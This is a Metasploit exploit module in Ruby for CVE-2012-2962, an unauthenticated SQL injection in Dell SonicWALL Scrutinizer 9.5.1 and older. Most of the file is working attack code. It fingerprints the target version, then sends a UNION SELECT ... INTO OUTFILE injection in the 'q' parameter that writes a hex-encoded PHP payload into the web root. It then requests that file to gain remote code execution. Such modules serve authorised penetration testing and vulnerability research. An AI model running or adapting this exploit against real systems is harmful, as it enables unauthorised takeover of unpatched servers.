# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##

require &#039;msf/core&#039;

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info={})
    super(update_info(info,
      &#039;Name&#039;           => "Dell SonicWALL Scrutinizer 9 SQL Injection",
      &#039;Description&#039;    => %q{
          This module exploits a vulnerability found in Dell SonicWall Scrutinizer.
        While handling the &#039;q&#039; parameter, the PHP application does not properly filter
        the user-supplied data, which can be manipulated to inject SQL commands, and
        then gain remote code execution.  Please note that authentication is NOT needed
        to exploit this vulnerability.
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
          &#039;muts&#039;,
          &#039;Devon Kearns&#039;,
          &#039;sinn3r&#039;
        ],
      &#039;References&#039;     =>
        [
          [&#039;CVE&#039;, &#039;2012-2962&#039;],
          [&#039;OSVDB&#039;, &#039;84232&#039;],
          [&#039;EDB&#039;, &#039;20033&#039;],
          [&#039;BID&#039;, &#039;54625&#039;],
          [&#039;URL&#039;, &#039;http://www.sonicwall.com/shared/download/Dell_SonicWALL_Scrutinizer_Service_Bulletin_for_SQL_injection_vulnerability_CVE.pdf&#039;]
        ],
      &#039;Payload&#039;        =>
        {
          &#039;BadChars&#039; => "\x00"
        },
      &#039;Platform&#039;       => &#039;php&#039;,
      &#039;Arch&#039;           => ARCH_PHP,
      &#039;Targets&#039;        =>
        [
          # According to advisory, version 9.5.1 and before are vulnerable.
          # But was only able to test this on 9.0.1.0
          [&#039;Dell SonicWall Scrutinizer 9.5.1 or older&#039;, {}]
        ],
      &#039;Privileged&#039;     => false,
      &#039;DisclosureDate&#039; => "Jul 22 2012",
      &#039;DefaultTarget&#039;  => 0))

      register_options(
        [
          OptString.new(&#039;TARGETURI&#039;, [true, &#039;The path to the SonicWall Scrutinizer\&#039;s statusFilter file&#039;, &#039;/d4d/statusFilter.php&#039;]),
          OptString.new(&#039;HTMLDIR&#039;,   [true, &#039;The HTML root directory for the web application&#039;, &#039;C:\\Program Files\\Scrutinizer\\html\\&#039;])
        ], self.class)
  end


  def check
    res = send_request_raw({&#039;uri&#039;=>target_uri.host})
    if res and res.body =~ /\<title\>Scrutinizer\<\/title\>/ and
               res.body =~ /\<div id\=\&#039;.+\&#039;\>Scrutinizer 9\.[0-5]\.[0-1]\<\/div\>/
      return Exploit::CheckCode::Vulnerable
    end

    return Exploit::CheckCode::Safe
  end


  def exploit
    peer = "#{rhost}:#{rport}"
    p = "<?php #{payload.encoded} ?>"
    hex_payload = p.unpack("H*")[0]
    php_fname   = Rex::Text.rand_text_alpha(5) + ".php"
    rnd_txt     = Rex::Text.rand_text_alpha_upper(3)

    print_status("#{peer} - Sending SQL injection...")
    res = send_request_cgi({
      &#039;uri&#039;       => target_uri.path,
      &#039;method&#039;    => &#039;POST&#039;,
      &#039;vars_post&#039; => {
        &#039;commonJson&#039; => &#039;protList&#039;,
        &#039;q&#039; => "#{rnd_txt}&#039; union select 0x#{hex_payload},0 into outfile &#039;../../html/d4d/#{php_fname}&#039;#"
      }
    })

    if res and res.body !~ /No Results Found/
      print_error("#{peer} - I don&#039;t think the SQL Injection attempt worked")
      return
    elsif not res
      print_error("#{peer} - No response from the server")
      return
    end

    # For debugging purposes, this is useful
    vprint_status(res.to_s)

    target_path = "#{File.dirname(target_uri.path)}/#{php_fname}"
    print_status("#{peer} - Requesting: #{target_path}")
    send_request_raw({&#039;uri&#039; => target_path})

    handler
  end
end



